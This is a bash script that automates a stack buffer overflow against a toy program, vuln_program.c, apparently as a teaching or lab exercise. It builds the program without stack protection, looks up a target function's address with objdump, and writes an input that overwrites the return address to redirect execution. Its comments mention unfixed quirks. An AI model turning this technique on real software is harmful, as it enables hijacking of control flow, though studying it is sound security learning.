 #!/bin/bash
clear
rm attack.input

#BUFFER SIZE
Y=10
Y=$((Y-1)) #adjusting bug from dec()
#HEX SIZE
X=8

dec(){
	a=""
	for h in ${@}; do
		a=$a`echo -e \\x$h | cat`
	done
	echo $a 
}

echo -e '\E[37;44m'"### compiling vuln_program.c and removing gcc protection\0033[0m"

g++ -fno-stack-protector vuln_program.c -o vuln
echo -e "\n"

echo -e '\E[37;44m'"### generate input accordingly with buffersize\0033[0m"

while [ $Y -gt 0 ]
do
	echo -n "x" >> input
	Y=$((Y-1))
done
echo -e "...\n"

echo -e '\E[37;44m'"### acquiring target address with objdump\0033[0m"

objdump -D ./vuln > out
grep "target" out | head -c 8 > out2
cat out2
echo -e "\n"

echo -e '\E[37;44m'"### reversing and making right hex representation\0033[0m"

#REVERSE IN PAIRS
while [ $X -gt 1 ]
do
	echo -n "\x" >> temp
	cut -c $((X-1))-$X out2 >> temp
	X=$((X-2))
done

cat temp | tr -d '\n' > temp2

HEXt=`cat temp2`
Z=4

#ADJUSTING STRING SIZE TO REACH EIP
while [ $Z -gt 0 ]
do
	echo $HEXt >> hex2
	Z=$((Z-1))
done

cat hex2 | tr -d '\n' > hex
cat temp2

HEX=`cat hex`
echo `dec $HEX` > hex2 #call function in the begining to convert hex to ascii
#its leaving an extra x in the hex2

echo -e "\n"

echo -e '\E[37;44m'"### generating final string\0033[0m"
paste -d '' input hex2 > attack.input #Merge the buffer size input and adjusted hex with target address
cat attack.input
echo -e "\n"

echo -e '\E[37;44m'"### testing attack string\0033[0m"
./vuln < attack.input

rm input
rm out
rm out2
rm hex
rm hex2
rm temp
rm temp2

